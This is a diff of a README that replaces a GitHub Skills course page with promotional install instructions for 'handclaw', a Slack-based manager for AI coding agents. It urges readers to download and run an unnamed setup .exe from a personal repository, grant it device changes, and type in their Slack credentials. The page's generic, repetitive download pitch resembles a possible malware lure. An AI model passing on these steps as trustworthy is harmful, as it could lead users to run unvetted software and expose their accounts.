@@ -1,64 +1,108 @@
-<header>
+# 🔥 handclaw - Manage Multiple AI Coding Agents Easily
 
-<!--
-  <<< Author notes: Course header >>>
-  Include a 1280×640 image, course title in sentence case, and a concise description in emphasis.
-  In your repository settings: enable template repository, add your 1280×640 social image, auto delete head branches.
-  Add your open source license, GitHub uses MIT license.
--->
+[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://github.com/LupiwoPhillips/handclaw)
 
-# Introduction to GitHub
+## 🔍 What is handclaw?
 
-_Get started using GitHub in less than an hour._
+handclaw lets you connect several AI coding assistants in one place—Slack. It allows you to code from any device and keep track of your agents' work. You can easily switch between different AI tools by renaming channels in Slack. This way, you stay organized, and coding becomes simpler.  
 
-</header>
+You can use popular AI models like Claude Code, Codex, and OpenCode all from your Slack workspace. No complicated setups or technical training required.
 
-<!--
-  <<< Author notes: Finish >>>
-  Review what we learned, ask for feedback, provide next steps.
--->
+## 🖥️ System Requirements
 
-## Finish
+- **Windows 10 or later** (64-bit recommended)  
+- **Internet connection** to communicate with Slack and AI agents  
+- **Slack account** with permission to add apps or bots in your workspace  
+- At least **100 MB free space** on your device  
+- Basic familiarity with Slack channels  
 
-_Congratulations, you've completed this course and joined the world of developers!_
+## 🚀 Getting Started with handclaw
 
-<img src=https://octodex.github.com/images/collabocats.jpg alt=celebrate width=300 align=right>
+This guide will help you download, install, and run handclaw on your Windows computer.
 
-Here's a recap of your accomplishments:
+### Step 1: Visit the Download Page  
 
-- You learned about GitHub, repositories, branches, commits, and pull requests.
-- You created a branch, a commit, and a pull request.
-- You merged a pull request.
-- You made your first contribution! :tada:
+Click the button below to go to the main page where you will find handclaw ready to download.  
 
-### What's next?
+[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://github.com/LupiwoPhillips/handclaw)
 
-If you'd like to make a profile README, use the quickstart instructions below or follow the instructions in the [Managing your profile README](https://docs.github.com/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/managing-your-profile-readme) article.
+### Step 2: Download the Latest Version
 
-1. Make a new public repository with a name that matches your GitHub username.
-2. Create a file named `README.md` in its root. The "root" means not inside any folder in your repository.
-3. Edit the contents of the `README.md` file.
-4. If you created a new branch for your file, open and merge a pull request on your branch.
-5. Lastly, we'd love to hear what you thought of this course [in our discussion board](https://github.com/orgs/skills/discussions/categories/introduction-to-github).
+On the page, look for the latest release or setup file. Most likely, the file will be named something like `handclaw-setup.exe` or similar.
 
-Check out these resources to learn more or get involved:
+- Click the file to save it to your computer.  
+- It may take a few seconds to several minutes depending on your internet speed.
 
-- Are you a student? Check out the [Student Developer Pack](https://education.github.com/pack).
-- [Take another GitHub Skills course](https://github.com/skills).
-- [Read the GitHub Getting Started docs](https://docs.github.com/en/get-started).
-- To find projects to contribute to, check out [GitHub Explore](https://github.com/explore).
+### Step 3: Run the Installer
 
-<footer>
+- Locate the downloaded file in your Downloads folder.  
+- Double-click the file to start the installation.  
+- Follow the on-screen instructions.  
+- When asked, allow the app to make changes to your device.
 
-<!--
-  <<< Author notes: Footer >>>
-  Add a link to get support, GitHub status page, code of conduct, license link.
--->
+### Step 4: Connect handclaw to Slack
 
----
+After installation, you need to connect handclaw with your Slack workspace.
 
-Get help: [Post in our discussion board](https://github.com/orgs/skills/discussions/categories/introduction-to-github) &bull; [Review the GitHub status page](https://www.githubstatus.com/)
+- Open handclaw on your computer.  
+- You will see options to log into your Slack account.  
+- Enter your Slack credentials.  
+- Allow handclaw permission to access your channels and messages.
 
-&copy; 2024 GitHub &bull; [Code of Conduct](https://www.contributor-covenant.org/version/2/1/code_of_conduct/code_of_conduct.md) &bull; [MIT License](https://gh.io/mit)
+Once connected, handclaw can start managing AI coding agents.
 
-</footer>
+## 🎯 How to Use handclaw
+
+handclaw works inside your Slack workspace. Here is what you can do:
+
+1. **Create Slack channels** for different coding tasks or projects.  
+2. **Rename channels** to switch between AI coding agents like Claude Code, Codex, and OpenCode.  
+3. **Send coding requests** through Slack messages in each channel.  
+4. **Monitor progress** by receiving updates from the AI agents directly in Slack.  
+5. Use handclaw from **any device**, including your phone, to keep coding while you move.
+
+This process lets you organize your coding workflow without leaving Slack.
+
+## 📋 Features Overview
+
+- Simple Slack integration without complex configurations.  
+- Support for multiple AI coding agents in one place.  
+- Real-time updates on coding tasks from agents.  
+- Use handclaw from mobile or desktop devices.  
+- Rename channels to change active AI assistant quickly.  
+- Monitor and manage projects remotely.  
+
+## ⚙️ Configuration Tips
+
+- Assign separate Slack channels to different tasks or coding assistants.  
+- Pin important messages or code snippets for easy access.  
+- Use Slack's notifications to stay informed about agent updates.  
+- Regularly check for handclaw updates on the GitHub page.  
+
+## 🛠 Troubleshooting
+
+- If handclaw doesn’t connect to Slack, check your internet connection and Slack permissions.  
+- Make sure you installed the latest version.  
+- Restart handclaw and Slack if updates don’t show.  
+- If messages from AI agents don’t appear, check that the correct channels are named after the AI you want to use.  
+- Contact your Slack workspace admin if you need extra permissions.
+
+## 🔒 Privacy and Security
+
+- handclaw only accesses Slack channels you allow.  
+- Your data stays within your Slack workspace and your local device.  
+- AI agents process coding requests securely via their providers.  
+
+## 💾 Uninstalling handclaw
+
+- Open the Windows Start menu.  
+- Go to Settings > Apps & features.  
+- Find handclaw in the list.  
+- Click it, then choose Uninstall.  
+- Follow the prompts to remove the application.
+
+## 📥 Ready to Download?
+
+Use the button below to visit the download page and get started.
+
+[![Download handclaw](https://img.shields.io/badge/Download%20handclaw-ff6f61?style=for-the-badge&logo=github)](https://github.com/LupiwoPhillips/handclaw)
